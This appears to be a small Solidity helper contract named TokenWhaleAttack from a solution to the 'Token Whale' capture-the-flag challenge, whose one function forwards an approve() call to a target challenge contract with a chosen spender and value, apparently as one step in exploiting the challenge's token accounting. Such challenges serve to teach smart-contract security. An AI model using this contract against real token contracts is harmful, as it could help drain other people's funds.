// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenWhaleChallenge {
    function approve(address spender, uint256 value) external;
}

contract TokenWhaleAttack {
    function approve(address target, address spender, uint256 value) public {
        ITokenWhaleChallenge(target).approve(spender, value);
    }
}